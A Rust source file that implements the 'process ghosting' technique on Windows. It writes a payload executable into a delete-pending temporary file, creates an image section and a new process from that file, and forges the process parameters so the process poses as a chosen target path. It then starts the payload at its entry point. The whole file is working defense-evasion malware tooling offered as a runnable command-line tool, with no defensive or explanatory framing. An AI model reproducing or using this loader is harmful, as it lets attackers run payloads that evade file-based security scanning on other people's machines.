use std::{
    mem::{size_of, zeroed},
    path::Path,
    ptr::null_mut,
};

use ntapi::{
    ntioapi::{
        FileDispositionInformation, NtOpenFile, NtSetInformationFile, NtWriteFile, FILE_SUPERSEDE,
        FILE_SYNCHRONOUS_IO_NONALERT, IO_STATUS_BLOCK, PIO_APC_ROUTINE,
    },
    ntmmapi::{NtCreateSection, NtReadVirtualMemory},
    ntobapi::NtClose,
    ntpebteb::{PEB, PPEB},
    ntpsapi::{
        NtCreateProcessEx, NtCreateThreadEx, NtCurrentPeb, NtCurrentProcess,
        NtQueryInformationProcess, NtTerminateProcess, ProcessBasicInformation,
        PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
    },
    ntrtl::{
        RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
        RTL_USER_PROC_PARAMS_NORMALIZED,
    },
};
use winapi::{
    shared::{
        minwindef::{FALSE, LPCVOID, LPVOID, MAX_PATH, TRUE},
        ntdef::{
            InitializeObjectAttributes, HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES,
            PUNICODE_STRING, PVOID, UNICODE_STRING,
        },
        ntstatus::{STATUS_INVALID_PARAMETER, STATUS_SUCCESS},
    },
    um::{
        errhandlingapi::GetLastError,
        fileapi::{
            CreateFileA, GetFileSize, GetTempFileNameA, GetTempPathA, FILE_DISPOSITION_INFO,
            OPEN_EXISTING,
        },
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        memoryapi::{
            MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree,
            WriteProcessMemory, FILE_MAP_READ,
        },
        processenv::GetCurrentDirectoryA,
        userenv::CreateEnvironmentBlock,
        winbase::CreateFileMappingA,
        winnt::{
            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ,
            FILE_SHARE_WRITE, GENERIC_READ, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
            IMAGE_FILE_MACHINE_AMD64, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
            LARGE_INTEGER, MEM_COMMIT, MEM_DECOMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE,
            PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS,
        },
    },
};

#[derive(Debug)]
struct Error {
    status: NTSTATUS,
}

impl core::convert::From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self {
        Self { status }
    }
}

unsafe fn open_file(path: &str) -> Result<HANDLE, Error> {
    let mut wide_string: Vec<_> = format!("\\??\\{}", path).encode_utf16().collect();
    wide_string.push(0x0); // c000003b
    let mut us_path = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_path, wide_string.as_ptr());

    let mut attr = zeroed::<OBJECT_ATTRIBUTES>();
    InitializeObjectAttributes(&mut attr, &mut us_path, 0x00000040, NULL, NULL);

    let mut status_block = zeroed::<IO_STATUS_BLOCK>();
    let mut filehandle: HANDLE = INVALID_HANDLE_VALUE;
    let status = NtOpenFile(
        &mut filehandle,
        DELETE | SYNCHRONIZE | FILE_GENERIC_WRITE | FILE_GENERIC_READ,
        &mut attr,
        &mut status_block,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
    );
    if !NT_SUCCESS(status) {
        println!("Failed to open file, status: {:x}", status);
        return Err(Error::from(status));
    }

    Ok(filehandle)
}

unsafe fn make_section_from_delete_pending_file(
    path: &str,
    payload: LPVOID,
    size: u32,
) -> Result<HANDLE, Error> {
    match open_file(path) {
        Ok(delete_file_handle) => {
            let mut status_block = zeroed::<IO_STATUS_BLOCK>();
            // set disposition flag
            let mut info = zeroed::<FILE_DISPOSITION_INFO>();
            info.DeleteFile = 1;

            // let _ =NtSetInformationFile(delete_file_handle, &mut status_block, &mut info, size_of::<FILE_DISPOSITION_INFORMATION >(), FileDispositionInformation)?;
            let status = NtSetInformationFile(
                delete_file_handle,
                &mut status_block,
                &mut info as *const _ as *mut _,
                size_of::<FILE_DISPOSITION_INFO>() as u32,
                FileDispositionInformation,
            );
            if !NT_SUCCESS(status) {
                println!("Setting file infomation failed: {:x}", status);
                NtClose(delete_file_handle);
                return Err(Error::from(status));
            }
            println!("[+] File Infomation set");

            let mut li = zeroed::<LARGE_INTEGER>();
            let status = NtWriteFile(
                delete_file_handle,
                NULL,
                zeroed::<PIO_APC_ROUTINE>(),
                NULL,
                &mut status_block,
                payload,
                size,
                &mut li,
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                println!("Writing payload failed: {:x}", status);
                NtClose(delete_file_handle);
                return Err(Error::from(status));
            }
            println!("[+] Written!!");

            let mut section_handle: HANDLE = INVALID_HANDLE_VALUE;
            let status = NtCreateSection(
                &mut section_handle, // rdi
                SECTION_ALL_ACCESS,
                null_mut(),
                null_mut(),
                PAGE_READONLY, // r8
                SEC_IMAGE,     // r9
                delete_file_handle,
            );
            if !NT_SUCCESS(status) {
                println!("Creating image section failed: {:x}", status);
                NtClose(delete_file_handle);
                return Err(Error::from(status));
            }

            NtClose(delete_file_handle);

            Ok(section_handle)
        }
        Err(_err) => Err(_err),
    }
}

#[inline]
unsafe fn get_current_directory() -> String {
    let mut cur_dir = String::with_capacity(MAX_PATH);
    GetCurrentDirectoryA(MAX_PATH as u32, cur_dir.as_mut_ptr().cast());
    cur_dir
}

#[inline]
unsafe fn get_directory(path: &str) -> Option<&str> {
    let path = Path::new(path);
    match path.parent() {
        Some(parent) => match parent.exists() {
            true => parent.to_str(),
            false => None,
        },
        None => None,
    }
}

/// Preserve the aligmnent! The remote address of the parameters must be the same as local.
unsafe fn write_params_into_process(
    process_handle: HANDLE,
    params: PRTL_USER_PROCESS_PARAMETERS,
) -> LPVOID {
    if params == null_mut() {
        return NULL;
    }

    match VirtualAllocEx(
        process_handle,
        params as *mut _,
        (*params).Length as usize + (*params).EnvironmentSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) {
        NULL => {
            println!("Allocating RemoteProcessParams failed: {}", GetLastError());
            NULL
        }
        _ => {
            match WriteProcessMemory(
                process_handle,
                params as *mut _,
                params as *const _,
                (*params).Length as usize,
                null_mut(),
            ) {
                TRUE => {
                    if (*params).Environment != NULL {
                        //     match VirtualAllocEx(process_handle, (*params).Environment as *mut _, (*params).EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) {
                        //         NULL => {
                        //             println!("Allocating EnvironmentBlock failed: {}", GetLastError());
                        //             println!("params: {:p}", params);
                        //             println!("params len: {:x}", (*params).Length);
                        //             println!("(*params).Environment: {:p}", (*params).Environment);
                        //             println!("(*params).EnvironmentSize: {:x}", (*params).EnvironmentSize);
                        //             NULL
                        //         }
                        //         _ => {
                        match WriteProcessMemory(
                            process_handle,
                            (*params).Environment as *mut _,
                            (*params).Environment as *const _,
                            (*params).EnvironmentSize,
                            null_mut(),
                        ) {
                            TRUE => {
                                println!("[+] Params Ready!");
                                params as *mut _
                            }
                            _ => {
                                println!("Writing EnvironmentBlock failed: {}", GetLastError());
                                NULL
                            }
                        }
                        // }
                        //     }
                    } else {
                        params as *mut _
                    }
                }
                _ => {
                    println!("Writing RemoteProcessParams failed: {}", GetLastError());
                    NULL
                }
            }
        }
    }
}

/// Write process parameters into peb
unsafe fn set_params_in_peb(params: LPVOID, process_handle: HANDLE, remote_peb: PPEB) -> bool {
    let to_pvoid = std::mem::transmute::<&PRTL_USER_PROCESS_PARAMETERS, LPVOID>(
        &(*remote_peb).ProcessParameters,
    );
    let params_to_lpcvoid = std::mem::transmute::<&PVOID, LPCVOID>(&params);
    if let FALSE = WriteProcessMemory(
        process_handle,
        to_pvoid,
        params_to_lpcvoid,
        size_of::<PVOID>(),
        null_mut(),
    ) {
        println!("Cannot update parameters: {}", GetLastError());
        return false;
    }
    return true;
}

unsafe fn setup_process_parameters(
    process_handle: HANDLE,
    pbi: PROCESS_BASIC_INFORMATION,
    target_path: &str,
) -> Result<(), Error> {
    let mut wide_target_path: Vec<_> = target_path.encode_utf16().collect();
    wide_target_path.push(0x0);
    let mut us_target_path = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_target_path, wide_target_path.as_ptr());

    let cur_dir = get_current_directory();
    let target_dir = get_directory(target_path).unwrap_or(cur_dir.as_str());
    let mut wide_target_dir: Vec<_> = target_dir.encode_utf16().collect();
    wide_target_dir.push(0x0);
    let mut us_target_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_target_dir, wide_target_dir.as_ptr());

    let dll_dir = "C:\\Windows\\System32";
    let mut wide_dll_dir: Vec<_> = dll_dir.encode_utf16().collect();
    wide_dll_dir.push(0x0);
    let mut us_dll_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_dll_dir, wide_dll_dir.as_ptr());

    // let window_name = "process ghosting test";
    let window_name = target_path;
    let mut wide_window_name: Vec<_> = window_name.encode_utf16().collect();
    wide_window_name.push(0x0);
    let mut us_window_name = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(&mut us_window_name, wide_window_name.as_ptr());

    let mut env_block: LPVOID = null_mut();
    let x = CreateEnvironmentBlock(&mut env_block, NULL, TRUE);
    println!("[+] CreateEnvironmentBlock {}", x);

    // fetch desktop info from current process:
    let mut desktop_info: PUNICODE_STRING = null_mut();
    let cur_proc_peb = NtCurrentPeb();
    if cur_proc_peb != null_mut() && (*cur_proc_peb).ProcessParameters != null_mut() {
        desktop_info = &mut (*(*cur_proc_peb).ProcessParameters).DesktopInfo;
    }

    let mut params: PRTL_USER_PROCESS_PARAMETERS = null_mut();
    let status = RtlCreateProcessParametersEx(
        &mut params,
        &mut us_target_path,
        &mut us_dll_dir,
        &mut us_target_dir,
        &mut us_target_path,
        env_block,
        &mut us_window_name,
        desktop_info,
        null_mut(),
        null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );
    if !NT_SUCCESS(status) {
        println!("Create Process Parameters Failed: {:x}", status);
        return Err(Error::from(status));
    }

    let remote_params = write_params_into_process(process_handle, params);
    if remote_params == NULL {
        println!("Cannot write parameters into remote process");
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    if !set_params_in_peb(remote_params as *mut _, process_handle, pbi.PebBaseAddress) {
        return Err(Error::from(STATUS_INVALID_PARAMETER));
    }

    println!("[+] Parameters Mapped!!");

    let remote_peb = buffer_remote_peb(process_handle, pbi)?;
    println!(
        "[+] Remote Parameters Block Address: {:p}",
        remote_peb.ProcessParameters
    );

    Ok(())
}

unsafe fn buffer_remote_peb(
    process_handle: HANDLE,
    pbi: PROCESS_BASIC_INFORMATION,
) -> Result<PEB, Error> {
    println!("[+] Remote PEB Address: {:p}", pbi.PebBaseAddress);
    let mut peb: PEB = zeroed::<PEB>();
    match NtReadVirtualMemory(
        process_handle,
        pbi.PebBaseAddress as *mut _,
        &mut peb as *const _ as *mut _,
        size_of::<PEB>(),
        null_mut(),
    ) {
        STATUS_SUCCESS => Ok(peb),
        status => {
            println!("Read PEB failed: {:x}", status);
            Err(Error::from(status))
        }
    }
}

unsafe fn get_nt_hdr(pe_buffer: LPVOID) -> LPVOID {
    if pe_buffer == NULL {
        return NULL;
    }
    let idh = pe_buffer as *const IMAGE_DOS_HEADER;
    if (*idh).e_magic != IMAGE_DOS_SIGNATURE {
        return NULL;
    }
    const MAX_OFFSET: i32 = 1024;
    let inh_offset = (*idh).e_lfanew;
    if inh_offset > MAX_OFFSET {
        return NULL;
    }
    let inh = (pe_buffer as usize + inh_offset as usize) as *const IMAGE_NT_HEADERS32;
    if (*inh).Signature != IMAGE_NT_SIGNATURE {
        return NULL;
    }
    return inh as LPVOID;
}

unsafe fn get_pe_architecture(pe_buffer: LPVOID) -> u16 {
    let inh = get_nt_hdr(pe_buffer);
    if inh == NULL {
        return 0;
    }

    return (*(inh as *const IMAGE_NT_HEADERS32)).FileHeader.Machine;
}

unsafe fn get_entry_point_rva(pe_buffer: LPVOID) -> Option<u32> {
    match get_nt_hdr(pe_buffer) {
        NULL => None,
        inh => match get_pe_architecture(pe_buffer) {
            IMAGE_FILE_MACHINE_AMD64 => {
                let inh = inh as *const IMAGE_NT_HEADERS64;
                Some((*inh).OptionalHeader.AddressOfEntryPoint)
            }
            _ => {
                let inh = inh as *const IMAGE_NT_HEADERS32;
                Some((*inh).OptionalHeader.AddressOfEntryPoint)
            }
        },
    }
}

unsafe fn process_ghosting(
    target_path: &str,
    payload_buf: LPVOID,
    payload_size: u32,
) -> Result<(), Error> {
    let mut temp_path: [u8; MAX_PATH] = [0; MAX_PATH];
    let _ = GetTempPathA(MAX_PATH as u32, temp_path.as_mut_ptr() as _);
    let mut dummy_name: [u8; MAX_PATH] = [0; MAX_PATH];
    let _ = GetTempFileNameA(
        temp_path.as_ptr() as _,
        "TH".as_ptr() as _,
        0,
        dummy_name.as_mut_ptr() as _,
    );
    println!(
        "[+] Make temp path: {}",
        String::from_utf8(dummy_name.to_vec()).unwrap()
    );

    match make_section_from_delete_pending_file(
        std::str::from_utf8_mut(dummy_name.to_vec().as_mut_slice()).unwrap(),
        payload_buf,
        payload_size,
    ) {
        Ok(section_handle) => {
            let mut process_handle: HANDLE = INVALID_HANDLE_VALUE;
            let status = NtCreateProcessEx(
                &mut process_handle,
                PROCESS_ALL_ACCESS,
                null_mut(),
                NtCurrentProcess,
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                section_handle,
                null_mut(),
                null_mut(),
                0,
            );
            if !NT_SUCCESS(status) {
                println!("Process create failed: {:x}", status);
                return Err(Error::from(status));
            }
            println!("[+] Process Created!");

            let mut pbi: PROCESS_BASIC_INFORMATION = zeroed::<PROCESS_BASIC_INFORMATION>();
            let status = NtQueryInformationProcess(
                process_handle,
                ProcessBasicInformation,
                &mut pbi as *const _ as *mut _,
                size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                &mut zeroed::<u32>(),
            );
            if !NT_SUCCESS(status) {
                println!("Query Process Information failed: {:x}", status);
                return Err(Error::from(status));
            }
            println!("[+] Process ID: {}", pbi.UniqueProcessId as u32);

            let peb = buffer_remote_peb(process_handle, pbi)?;
            println!("[+] Remote Image Base Address: {:p}", peb.ImageBaseAddress);

            println!("[+] Payload PE Magic: {:x}", *(payload_buf as *const u16));
            let ep_rva = get_entry_point_rva(payload_buf)
                .expect("Get Payload Image Entry Point RVA Failed!");
            println!("[+] Payload Entry Point RVA: 0x{:x}", ep_rva);
            let proc_entry = peb.ImageBaseAddress as u64 + ep_rva as u64;
            println!("[+] Remote Image Entry Address: 0x{:x}", proc_entry);

            println!(
                "[+] Target parent directory: {}",
                get_directory(target_path).unwrap_or(get_current_directory().as_str())
            );

            match setup_process_parameters(process_handle, pbi, target_path) {
                Ok(()) => {
                    let mut thread_handle: HANDLE = INVALID_HANDLE_VALUE;
                    let status = NtCreateThreadEx(
                        &mut thread_handle,
                        THREAD_ALL_ACCESS,
                        null_mut(),
                        process_handle,
                        proc_entry as *mut _,
                        null_mut(),
                        0,
                        0,
                        0,
                        0,
                        null_mut(),
                    );
                    if !NT_SUCCESS(status) {
                        println!("Thread Create Failed: {:x}", status);
                        NtTerminateProcess(process_handle, 0);
                        return Err(Error::from(status));
                    }
                    Ok(())
                }
                Err(_err) => {
                    NtTerminateProcess(process_handle, 0);
                    Err(_err)
                }
            }
        }
        Err(_err) => Err(_err),
    }
}

unsafe fn buffer_payload(path: &str) -> Option<(PVOID, u32)> {
    match CreateFileA(
        path.as_ptr() as *const _,
        GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    ) {
        INVALID_HANDLE_VALUE => {
            println!("Read file failed: {}", GetLastError());
            None
        }
        file_handle => {
            match CreateFileMappingA(file_handle, null_mut(), PAGE_READONLY, 0, 0, null_mut()) {
                INVALID_HANDLE_VALUE => {
                    println!("Mapping file failed: {}", GetLastError());
                    CloseHandle(file_handle);
                    None
                }
                map_handle => {
                    match MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0) {
                        NULL => {
                            println!("Call MapViewOfFile failed: {}", GetLastError());
                            CloseHandle(map_handle);
                            CloseHandle(file_handle);
                            None
                        }
                        mapped_view_addr => {
                            let file_size = GetFileSize(file_handle, null_mut());
                            match VirtualAlloc(
                                NULL,
                                file_size as usize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE,
                            ) {
                                NULL => {
                                    println!("Allocate memory failed: {}", GetLastError());
                                    UnmapViewOfFile(mapped_view_addr);
                                    CloseHandle(map_handle);
                                    CloseHandle(file_handle);
                                    None
                                }
                                payload_raw => {
                                    // equivalent with c memcpy
                                    std::ptr::copy_nonoverlapping(
                                        mapped_view_addr as *const u8,
                                        payload_raw as *mut u8,
                                        file_size as usize,
                                    );
                                    UnmapViewOfFile(mapped_view_addr);
                                    CloseHandle(map_handle);
                                    CloseHandle(file_handle);

                                    Some((payload_raw, file_size))
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        let procname = Path::new(args[0].as_str())
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();
        println!("Usage: {} <target_path> <payload_path>", procname);
        std::process::exit(1);
    }

    let target_path = args[1].as_str();
    let payload_path = args[2].as_str();

    unsafe {
        println!("[+] Reading payload raw to memory");
        match buffer_payload(payload_path) {
            Some((payload_buf, payload_size)) => {
                println!("[+] Payload memory address {:p}", payload_buf);
                match process_ghosting(target_path, payload_buf, payload_size) {
                    Ok(()) => {
                        println!("[+] Yes!!");
                        // use std::process::Command;
                        // let _ = Command::new("cmd").args(["/c", "pause"]).status();
                    }
                    Err(_err) => {
                        println!("Error: {:x}", _err.status);
                    }
                }
                VirtualFree(payload_buf, payload_size as usize, MEM_DECOMMIT);
            }
            None => {}
        }
    }
}
